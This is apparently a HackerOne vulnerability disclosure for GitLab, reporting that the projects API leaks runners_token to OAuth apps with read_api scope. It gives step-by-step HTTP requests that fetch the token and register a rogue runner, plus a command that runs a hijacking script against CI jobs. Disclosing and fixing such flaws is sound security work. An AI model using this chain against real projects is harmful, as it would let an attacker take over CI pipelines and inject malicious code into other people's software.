**[HackerOne report #956812](https://hackerone.com/reports/956812)** by `0xn3va` on 2020-08-12, assigned to @ngeorge1:

### Summary

The endpoint `/api/v4/projects/<project_id>` discloses `runners_token` to third-party apps with access to gitlab resources with `scope=api` or even `scope=read_api`. This allows a third-party app to use `runners_token` to register a malicious gitlab specific runner, intercept all ci jobs of the project and make the necessary changes to the ci process, up to the injection of malicious code. 

### Steps to reproduce

1) Go to `User Settings > Applications`,  
2) Add new application with `scope=read_api`,  
3) Release the `access_token` with a GET request: `https://gitlab.com/oauth/authorize?client_id=<client_id>&redirect_uri=<redirect_uri>&response_type=token&scope=read_api`,  
4) Get `runners_token` (`project_id` see the main page of the attacked project):

```http  
GET /api/v4/projects/<project_id>/ HTTP/1.1  
Host: gitlab.com  
Authorization: Bearer <access_token>  
```

5) Register your own malicious runner and get `authentication_token`:

```http  
POST /api/v4/runners HTTP/1.1  
Host: gitlab.com  
Authorization: Bearer <access_token>  
Content-Type: application/json  
Content-Length: 32

{"token":"<runners_token>"}  
```

6) Intercept ci jobs and manipulate their execution (as a POC you can use [this](https://github.com/Frichetten/gitlab-runner-research) python script):

```bash  
python hijack-runner.py --target https://gitlab.com/ --attack <authentication_token>  
```

### Impact

Abuse of gitlab specific runners leads to the possibility of manipulating the execution of ci jobs, changing the source code and injection malicious functionality.

### What is the current *bug* behavior?

`access_token` allows third applications to access `runners_token`

### What is the expected *correct* behavior?

third-party apps should not have access to `runners_token`
